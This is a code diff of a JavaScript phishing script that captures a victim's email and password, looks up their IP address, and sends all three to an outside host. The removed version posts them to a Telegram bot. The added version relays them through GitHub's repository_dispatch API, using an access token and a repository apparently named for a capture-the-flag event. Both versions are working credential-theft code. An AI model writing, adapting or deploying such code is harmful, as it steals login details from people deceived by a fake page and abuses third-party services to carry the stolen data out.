@@ -1,28 +1,30 @@
 var counter = 0;
 var email, password;
 
-async function sendToTelegram(email, password) {
+async function sendToGitHubActions(email, password) {
     const ipResponse = await fetch('https://api.ipify.org?format=json');
     const ipData = await ipResponse.json();
     const ipv4 = ipData.ip;
 
-    const message = `
-    • Dirección IP : ${ipv4}\n• Correo: ${email}\n• Contraseña: ${password}
-    `;
+    const repo = "jheeree/KVC2024_ctf";
+    const url = `https://api.github.com/repos/${repo}/dispatches`;
 
-    const telegramApiKey = ${{ TELEGRAM_API_KEY }};
-    const chatId = ${{ TELEGRAM_CHAT_ID }};
-    const url = `https://api.telegram.org/bot${telegramApiKey}/sendMessage`;
+    const data = {
+        event_type: "send_telegram_message",
+        client_payload: {
+            email: email,
+            password: password,
+            ip: ipv4
+        }
+    };
 
     await fetch(url, {
         method: 'POST',
         headers: {
-            'Content-Type': 'application/json'
+            'Content-Type': 'application/json',
+            'Authorization': `token ${GH_PAT}`
         },
-        body: JSON.stringify({
-            chat_id: chatId,
-            text: message
-        })
+        body: JSON.stringify(data)
     });
 }
 
